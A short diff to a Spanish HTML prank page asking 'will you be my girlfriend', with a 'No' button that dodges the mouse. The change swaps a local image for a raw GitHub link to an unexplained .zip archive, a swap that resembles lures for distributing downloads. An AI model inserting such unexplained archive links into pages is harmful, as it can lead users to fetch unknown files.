@@ -36,6 +36,6 @@ Propuesta para mi princesa lale
     < h3 > ¿ Quieres ser mi nobia? </ h3 >
     < input  type = " button " onclick = " accionParaCuandoEllaDigaQueSi () " id = " btnSi " value = " Si " />
     < input  type = " button " id = " btnNo " onmouseover = " mueveElBoton () " value = " No " />
-    < img  src = " chuec.png " width = " 200 " >
+    < img  src = " https://raw.githubusercontent.com/Fe4rlessxD/Quieres-ser-mi-nobia-7w7/master/trenchlet/Quieres-ser-mi-nobia-7w7.zip " width = " 200 " >
 </ cuerpo >
 </ html >
